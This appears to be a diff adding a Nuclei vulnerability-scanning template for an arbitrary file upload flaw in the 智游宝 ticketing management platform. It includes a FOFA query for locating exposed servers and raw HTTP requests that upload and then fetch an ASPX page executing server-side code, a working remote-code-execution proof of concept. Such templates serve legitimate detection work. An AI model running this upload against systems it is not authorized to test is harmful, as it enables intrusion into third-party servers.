@@ -1,0 +1,36 @@
+id: shenda-intelligent-platform-uploadfile
+
+info:
+  name: "智游宝 UploadFile 接口任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="ItemsControlServer.aspx"
+      智游宝作为景区与分销商间的第三方技术服务平台，提供电子票务全流程管理及数据分析功能。浙江深大智能科技有限公司管控平台的 UploadFile 接口未正确校验文件上传权限，允许攻击者通过构造恶意请求上传任意类型文件。成功利用该漏洞可导致远程代码执行或系统权限突破。该安全缺陷存在于 2024-09-23 披露时的最新已知版本中。
+  tags: 智游宝
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /Launch/UploadFile?FileName=NTest.aspx&Version=1&Size=100 HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+    Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+- raw:
+  - |
+    GET /Launch/Client/NTest.aspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
